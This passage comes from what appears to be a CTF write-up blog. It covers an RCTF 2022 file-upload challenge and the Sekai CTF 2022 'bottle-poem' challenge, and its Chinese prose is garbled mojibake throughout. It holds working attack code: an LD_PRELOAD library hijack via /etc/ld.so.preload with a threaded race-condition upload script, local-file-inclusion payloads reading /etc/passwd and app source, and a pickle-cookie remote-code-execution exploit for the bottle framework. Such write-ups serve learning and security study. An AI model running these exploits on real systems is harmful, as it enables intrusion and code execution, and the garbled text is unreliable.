<h3 id="æ„é€ åˆ©ç”¨æ–‡ä»¶"><a href="#æ„é€ åˆ©ç”¨æ–‡ä»¶" class="headerlink" title="æ„é€ åˆ©ç”¨æ–‡ä»¶"></a>æ„é€ åˆ©ç”¨æ–‡ä»¶</h3><p>äºæ˜¯æ„é€ äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p><code>haha.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">magic_version</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc haha.c -o haha.so -fPIC -shared -ldl -D_GNU_SOURCE</span><br><span class="line"><span class="comment">#-fPIC: æŒ‡å®šç”Ÿæˆä½ç½®æ— å…³ä»£ç ï¼ˆPosition-Independent Code, PICï¼‰ï¼Œè¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå…±äº«åº“å¯ä»¥åœ¨å†…å­˜ä¸­çš„ä»»æ„ä½ç½®åŠ è½½ï¼Œæ‰€ä»¥éœ€è¦ç¡®ä¿ä»£ç ä¸­çš„åœ°å€å¼•ç”¨æ˜¯ç›¸å¯¹çš„è€Œä¸æ˜¯ç»å¯¹çš„ã€‚</span></span><br><span class="line"><span class="comment">#-shared: æŒ‡å®šç”Ÿæˆå…±äº«åº“ï¼Œè¿™æ„å‘³ç€ä»£ç å°†è¢«ç¼–è¯‘æˆä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼ˆä¹Ÿç§°ä¸ºå…±äº«å¯¹è±¡ï¼‰ï¼Œè€Œä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="comment">#-ldl: é“¾æ¥åŠ¨æ€åŠ è½½å™¨åº“ï¼ˆDynamic Loading Library, dlï¼‰ï¼Œè¿™ä¸ªåº“æä¾›äº†åŠ¨æ€åŠ è½½å’Œé“¾æ¥å…±äº«åº“çš„æ¥å£ï¼Œç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒæ¥åœ¨è¿è¡Œæ—¶åŠ è½½å’Œé“¾æ¥å…±äº«åº“ã€‚</span></span><br><span class="line"><span class="comment">#-D_GNU_SOURCE: å®šä¹‰ä¸€ä¸ªå®ï¼Œå®ƒå‘Šè¯‰ç¼–è¯‘å™¨ä½¿ç”¨ GNU æ ‡å‡†åº“çš„ç‰¹å®šåŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½ä¸æ˜¯ C æ ‡å‡†çš„ä¸€éƒ¨åˆ†ã€‚</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>haha.so</code>ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ä¼ åˆ°&#x2F;tmpä¸‹ï¼Œé¿å…åœ¨uploadç›®å½•ä¸‹è¢«</p>
<p>äºæ˜¯å¯ä»¥æ„é€ <code>/etc/ld.so.preload</code>å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>haha.so</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å®ƒå°±ä¼šåŠ è½½<code>/tmp/haha.so</code></p>
<hr>
<p>ä½†æ˜¯ä¸Šä¼ å®Œä¸€ä¸ªæ–‡ä»¶åï¼Œæ‰§è¡Œå®Œ<code>/bin/file</code>ï¼Œä¼šæ‰§è¡Œ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">os.remove(filepath)</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤è¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æƒ³è¦åœ¨å®ç°ä¸Šé¢æ“ä½œï¼Œå°±å¿…é¡»åœ¨&#x2F;bin&#x2F;fileæ‰§è¡Œå‰å°†ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šå»ï¼Œæ‰èƒ½å®ç°åŠ«æŒè¯¥å‘½ä»¤å®ç°<code>cat /flag</code>ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è¿›è¡Œæ¡ä»¶ç«äº‰</p>
<p>å†™ä¸ªç®€å•pyè¿›è¡Œç«äº‰ï¼Œæˆ–è€…ç”¨bpæ”¾åŒ…</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.80.138:3000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload1</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file-upload&quot;</span>: (<span class="string">&quot;/etc/ld.so.preload&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./ld.so.preload&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;</span><br><span class="line">    res = requests.post(url, files=file)</span><br><span class="line">    <span class="built_in">print</span>(re.findall(<span class="string">&quot;&lt;h3&gt;(.*)&lt;/h3&gt;&quot;</span>, res.text, re.S)[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload2</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file-upload&quot;</span>: (<span class="string">&quot;/tmp/haha.so&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./haha.so&quot;</span>, <span class="string">&quot;rb&quot;</span>))&#125;</span><br><span class="line">    res = requests.post(url, files=file)</span><br><span class="line">    <span class="built_in">print</span>(re.findall(<span class="string">&quot;&lt;h3&gt;(.*)&lt;/h3&gt;&quot;</span>, res.text, re.S)[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        threading.Thread(target=upload1).start()</span><br><span class="line">        threading.Thread(target=upload2).start()</span><br></pre></td></tr></table></figure>

<p><img src="/post/2022RCTF/image-20230315222627587.png" alt="image-20230315222627587"></p>
<p>å¾—åˆ°flag</p>
<h2 id="C3"><a href="#C3" class="headerlink" title="C3"></a>C3</h2><p>ä¸€é“0è§£çš„é¢˜ç›®ï¼Œæœ€åæç¤ºäº†ç«¯å£ï¼Œçœ‹åˆ°å°±æƒ³åˆ°<code>Cobaltstrike</code>ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œäºæ˜¯å‡†å¤‡å¤ç°<code>CVE-2022-39197</code>ï¼Œå½“ä½œé¢˜ç›®å¤ç°äº†ï¼Œå†…å®¹å†™åœ¨åœ¨<code>CVEæ¼æ´å­¦ä¹ </code></p>
<blockquote>
<p>hintï¼š</p>
<p>Command and Control.</p>
<p>è¯¥é¢˜æ— éœ€çˆ†ç ´ï¼›</p>
<p>port 50050</p>
</blockquote>
<p>è¿™æ˜¯ä¸€é“<code>CVE-2022-39197</code>ã€<code>Cobaltstrike RCE</code>ã€‘çœŸå®ç¯å¢ƒä¸­çš„æ¼æ´åˆ©ç”¨</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Sekai CTF 2022</title>
    <url>//post/2022SekaiCTF/</url>
    <content><![CDATA[<p><code>å›½å¤–æ¯”èµ›éš¾åº¦ç¡®å®é€†å¤©</code></p>
<span id="more"></span>

<h1 id="Sekai-CTF-2022"><a href="#Sekai-CTF-2022" class="headerlink" title="Sekai CTF 2022"></a>Sekai CTF 2022</h1><p><a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a></p>
<p>è¿™æ˜¯å®˜æ–¹çš„<code>wp</code>å’Œé¢˜ç›®çš„<code>docker</code>ï¼Œæˆ‘åé¢è¿˜æ˜¯æŠŠ<code>web</code>éƒ½å¤ç°ä¸€ä¸‹</p>
<p><img src="/post/2022SekaiCTF/image-20221003101420158.png" alt="image-20221003101420158"></p>
<p><code>å¤§æ¯”èµ›ï¼Œæ¯ä¸ªé¢˜è¦ä¹ˆéš¾å‡ºå¤´ï¼Œè¦ä¹ˆæ„Ÿè§‰å°±å·®ä¸€ç‚¹ï¼Œä¸å¤§ä½¬çš„å·®è·ï¼Œé¼ é¼ åªèƒ½èµ›åå¤ç°wpäº†</code></p>
<p><img src="/post/2022SekaiCTF/image-20221003104433566.png" alt="image-20221003104433566"></p>
<p><code>è¿™æ˜¯webéš¾åº¦ã€çœ‹èµ·æ¥å°±æ˜¯æŒ‰è§£é¢˜äººæ•°æ¥åˆ†ã€‘</code></p>
<h2 id="1-bottle-poem-åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯"><a href="#1-bottle-poem-åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯" class="headerlink" title="1.bottle-poem[åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯]"></a>1.bottle-poem[åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯]</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">hintï¼š</span><br><span class="line"></span><br><span class="line">Come <span class="keyword">and</span> read poems <span class="keyword">in</span> the bottle.</span><br><span class="line"></span><br><span class="line">No bruteforcing <span class="keyword">is</span> required to solve this challenge. Please do <span class="keyword">not</span> use scanner tools. Rate limiting <span class="keyword">is</span> applied. Flag <span class="keyword">is</span> executable on server.</span><br><span class="line"></span><br><span class="line">ç¿»è¯‘ï¼š</span><br><span class="line"></span><br><span class="line">å¿«æ¥è¯»ä¸€è¯»ç“¶ä¸­çš„è¯—å§ã€‚</span><br><span class="line"></span><br><span class="line">è§£å†³è¿™ä¸€æŒ‘æˆ˜ä¸éœ€è¦æš´åŠ›ç ´è§£ã€‚è¯·ä¸è¦ä½¿ç”¨æ‰«æä»ªå·¥å…·ã€‚åº”ç”¨é€Ÿç‡é™åˆ¶ã€‚æ ‡å¿—åœ¨æœåŠ¡å™¨ä¸Šæ˜¯å¯æ‰§è¡Œçš„ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æˆ‘å·²ç»ç§ƒå¤´äº†ï¼Œå¼€å§‹è§‰å¾—æ˜¯å•çº¯çš„æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯åé¢çœ‹åˆ°å®˜æ–¹å‘çš„wpï¼Œæ„Ÿè§‰åˆæ²¡é‚£ä¹ˆç®€å•</p>
<p>æˆ‘å…ˆç›´æ¥å±•ç¤ºå®˜æ–¹çš„wpï¼Œç„¶åå†å±•ç¤ºæˆ‘å¤ç°çš„è¿‡ç¨‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Hey guys Thx <span class="keyword">for</span> attending SekaiCTF  i made two challenges <span class="keyword">for</span> this competition one <span class="keyword">is</span> bottle poem another <span class="keyword">is</span> sekaigame start</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> the bottle poem most of people think its guessy <span class="keyword">and</span> at the start the challenge always down  so say sorry to u <span class="keyword">and</span> respect to my buddy hfz that he fix this challenge </span><br><span class="line"></span><br><span class="line">here <span class="keyword">is</span> my short wp</span><br><span class="line">-----------------</span><br><span class="line">it<span class="string">&#x27;s easy to find that this website has LFI</span></span><br><span class="line"><span class="string">u wanna to  read file directly but failed </span></span><br><span class="line"><span class="string">that&#x27;</span>s <span class="keyword">not</span> show u that we hide it  that means u havent enough execute permission to read it (so we update description that flag <span class="keyword">is</span> executable <span class="keyword">and</span> u dont need some bruteforcing <span class="keyword">or</span> guessing)flag <span class="keyword">is</span> <span class="keyword">in</span> the common path /flag</span><br><span class="line"></span><br><span class="line">so we need to read source</span><br><span class="line">just like this</span><br><span class="line"></span><br><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/proc/self/cwd/app.py</span><br><span class="line"></span><br><span class="line">so dont need to bruteforce proc/self/ just use it to got sourcecode</span><br><span class="line"></span><br><span class="line">use this way u can read the secret --sekai</span><br><span class="line"></span><br><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/proc/self/cwd/config/secret.py</span><br><span class="line"></span><br><span class="line">now u can control the cookies but <span class="keyword">if</span> u read something just like /views/admin.html <span class="keyword">or</span> just make guest to admin u would find its a troll </span><br><span class="line"></span><br><span class="line">so u need rce truely <span class="keyword">if</span> u search some documentation will find the bottle<span class="string">&#x27;s cookie_decode() will unpickle so use this to get rce</span></span><br><span class="line"><span class="string">https://github.com/bottlepy/bottle/issues/900</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">here the steps</span></span><br><span class="line"><span class="string">1.lfi to read file and    secret</span></span><br><span class="line"><span class="string">2.use cookie pickle rce to reverse a shell</span></span><br><span class="line"><span class="string">3.execute /flag to get flag</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">and my exp </span></span><br><span class="line"><span class="string">-------------</span></span><br><span class="line"><span class="string">demo exp</span></span><br><span class="line"><span class="string">import base64,hashlib,pickle,hmac</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">def tob(s, enc=&#x27;</span>utf8<span class="string">&#x27;):</span></span><br><span class="line"><span class="string">    if isinstance(s, str):</span></span><br><span class="line"><span class="string">        return s.encode(enc)</span></span><br><span class="line"><span class="string">    return b&#x27;</span><span class="string">&#x27; if s is None else bytes(s)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def cookie_encode(data, key):</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span> Encode <span class="keyword">and</span> sign a pickle-able <span class="built_in">object</span>. Return a (byte) string <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    msg = base64.b64encode(pickle.dumps(data, 0))</span></span><br><span class="line"><span class="string">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span></span><br><span class="line"><span class="string">    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class test():</span></span><br><span class="line"><span class="string">    def __reduce__(self):</span></span><br><span class="line"><span class="string">        return (eval,(&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;,))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">obj = test()</span></span><br><span class="line"><span class="string">a = cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)</span></span><br><span class="line"><span class="string">print(a)</span></span><br></pre></td></tr></table></figure>

<p>ç¿»è¯‘</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">å¤§å®¶å¥½ï¼Œæ„Ÿè°¢å‚åŠ  SekaiCTF æˆ‘ä¸ºè¿™æ¬¡æ¯”èµ›æå‡ºäº†ä¸¤ä¸ªæŒ‘æˆ˜ï¼Œä¸€ä¸ªæ˜¯ç“¶å­è¯—ï¼Œå¦ä¸€ä¸ªæ˜¯ sekaigame start</span><br><span class="line"></span><br><span class="line">å¯¹äºç“¶å­è¯—ï¼Œå¤§å¤šæ•°äººè®¤ä¸ºå®ƒæ˜¯çŒœæµ‹æ€§çš„ï¼Œä¸€å¼€å§‹æŒ‘æˆ˜æ€»æ˜¯å¤±è´¥ï¼Œæ‰€ä»¥å‘ä½ è¯´å£°æŠ±æ­‰ï¼Œå¹¶å°Šé‡æˆ‘çš„å¥½å‹ hfzï¼Œä»–è§£å†³äº†è¿™ä¸ªæŒ‘æˆ˜</span><br><span class="line"></span><br><span class="line">è¿™æ˜¯æˆ‘çš„ç®€çŸ­ wp</span><br><span class="line">-----------------</span><br><span class="line">å¾ˆå®¹æ˜“å‘ç°è¿™ä¸ªç½‘ç«™æœ‰LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰</span><br><span class="line">ä½ æƒ³ç›´æ¥è¯»å–æ–‡ä»¶ä½†å¤±è´¥äº†</span><br><span class="line">è¿™å¹¶æ²¡æœ‰å‘Šè¯‰ä½ æˆ‘ä»¬éšè—å®ƒï¼Œè¿™æ„å‘³ç€ä½ æ²¡æœ‰è¶³å¤Ÿçš„æ‰§è¡Œæƒé™æ¥è¯»å–å®ƒï¼ˆæ‰€ä»¥æˆ‘ä»¬æ›´æ–°äº†æ ‡å¿—æ˜¯å¯æ‰§è¡Œçš„å¹¶ä¸”ä½ ä¸éœ€è¦ä¸€äº›æš´åŠ›ç ´è§£æˆ–çŒœæµ‹çš„æè¿°ï¼‰æ ‡å¿—åœ¨å…¬å…±è·¯å¾„/æ ‡å¿—ä¸­</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬éœ€è¦é˜…è¯»æºç </span><br><span class="line">åƒè¿™æ ·</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd/app.py</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¸éœ€è¦è›®åŠ› proc<span class="regexp">/self/</span> åªéœ€ä½¿ç”¨å®ƒæ¥è·å–æºä»£ç </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨è¿™ç§æ–¹å¼ä½ å¯ä»¥é˜…è¯»ç§˜å¯†--sekai</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd<span class="regexp">/config/</span>secret.py</span><br><span class="line"></span><br><span class="line">ç°åœ¨æ‚¨å¯ä»¥æ§åˆ¶ cookieï¼Œä½†å¦‚æœæ‚¨é˜…è¯» <span class="regexp">/views/</span>admin.html ä¹‹ç±»çš„å†…å®¹ï¼Œæˆ–è€…åªæ˜¯è®©è®¿å®¢æˆä¸ºç®¡ç†å‘˜ï¼Œæ‚¨ä¼šå‘ç°å®ƒæ˜¯ä¸€ä¸ªå·¨é­”ï¼ˆå¯ä»¥ç†è§£ä¸ºæ¶æï¼‰</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä½ çœŸçš„éœ€è¦ rce å¦‚æœä½ æœç´¢ä¸€äº›æ–‡æ¡£ä¼šå‘ç°ç“¶å­çš„ cookie_decode() ä¼šè§£å¼€æ‰€ä»¥ç”¨å®ƒæ¥è·å– rce</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/bottlepy/</span>bottle<span class="regexp">/issues/</span><span class="number">900</span></span><br><span class="line"></span><br><span class="line">è¿™é‡Œçš„æ­¥éª¤</span><br><span class="line"><span class="number">1</span>.lfiè¯»å–æ–‡ä»¶å’Œç§˜å¯†</span><br><span class="line"><span class="number">2</span>.ä½¿ç”¨cookie pickle rce åå¼¹ä¸€ä¸ªshell</span><br><span class="line"><span class="number">3</span>.æ‰§è¡Œ/flagè·å–flag</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">demo exp</span><br><span class="line"><span class="keyword">import</span> base64,hashlib,pickle,hmac</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s.encode(enc)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;</span></span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, <span class="number">0</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = test()</span><br><span class="line">a = cookie_encode(obj,<span class="string">&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<hr>
<p>ä¸‹é¢æ˜¯æˆ‘å¤ç°ç†è§£æ“ä½œ</p>
<p>å…ˆæ‰“å¼€ç½‘ç«™ï¼Œçœ‹åˆ°æœ‰ä¸‰ä¸ªå¯ä»¥æ‰“å¼€çš„é“¾æ¥</p>
<p><img src="/post/2022SekaiCTF/image-20221003201506807.png" alt="image-20221003201506807"></p>
<p>å…ˆçœ‹çœ‹æºç </p>
<p><img src="/post/2022SekaiCTF/image-20221003201547093.png" alt="image-20221003201547093"></p>
<p>å‘ç°æ²¡ä»€ä¹ˆé¢å¤–çš„ä¿¡æ¯ï¼Œä¸‰ä¸ªé“¾æ¥æ˜¯å¯¹åº”ç€ä¸‰ä¸ªæ–‡æœ¬æ–‡ä»¶</p>
<p>çœ‹èµ·æ¥ä¼¼ä¹æ˜¯æ–‡ä»¶åŒ…å«çš„é¢˜</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=spring.txt</span><br></pre></td></tr></table></figure>

<p><img src="/post/2022SekaiCTF/image-20221003202543907.png" alt="image-20221003202543907"></p>
<p>æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½æ˜¾ç¤ºå…¶ä»–ä¿¡æ¯ï¼Œæˆ‘åœ¨åšçš„æ—¶å€™è¯•çš„æ˜¯<code>/etc/passwd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/post/2022SekaiCTF/image-20221003202814644.png" alt="image-20221003202814644"></p>
<p>çœ‹æ¥æ˜¯æ–¹å‘å¯¹äº†ï¼Œç¡®å®æ˜¯å¯ä»¥åŒ…å«æœ¬åœ°æ–‡ä»¶å¹¶æ˜¾ç¤ºï¼Œä½†æ˜¯æ²¡æœ‰å…¶ä»–ä¿¡æ¯èƒ½åˆ©ç”¨</p>
<h3 id="æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤"><a href="#æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤" class="headerlink" title="*æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤"></a>*æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤</h3><p>è¿™ä¸ªæ˜¯çœ‹æœ€åå‘çš„<code>wp</code>ï¼Œå­¦åˆ°äº†</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/proc/</span><span class="keyword">self</span><span class="operator">/</span>cmdline</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯¥æ–‡ä»¶åŒ…å«çš„æ˜¯è¯¥è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ï¼ŒåŒ…æ‹¬è¿›ç¨‹çš„å¯åŠ¨è·¯å¾„(argv[0])</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åä¼šä¸‹è½½ä¸€ä¸ªåå«<code>show</code>çš„æ–‡ä»¶</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">python3 -<span class="keyword">u</span> /<span class="keyword">app</span>/<span class="keyword">app</span>.py </span><br></pre></td></tr></table></figure>

<p>åœ¨å‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬å‘ç°è¿è¡Œäº†ä¸€ä¸ª<code>/app/app.py</code>çš„æ–‡ä»¶</p>
<p>çœ‹æ¥è¿™å°±æ˜¯æˆ‘ä»¬ç½‘ç«™å¯åŠ¨çš„è„šæœ¬ï¼Œé‡Œé¢å°±æœ‰æˆ‘ä»¬ç½‘ç«™çš„æºç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/app/app.py</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹åˆ°æ–‡ä»¶æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, request, response, error</span><br><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/show&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    response.content_type = <span class="string">&quot;text/plain; charset=UTF-8&quot;</span></span><br><span class="line">    param = request.query.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../app&quot;</span>, param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No!!!!&quot;</span></span><br><span class="line">    requested_path = os.path.join(os.getcwd() + <span class="string">&quot;/poems&quot;</span>, param)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">            tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No This Poems&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=sekai)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=sekai)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°<code>config.secret</code>ï¼Œè¿™æ˜¯ä¸ªæ–‡ä»¶è·¯å¾„<code>/config/secret</code></p>
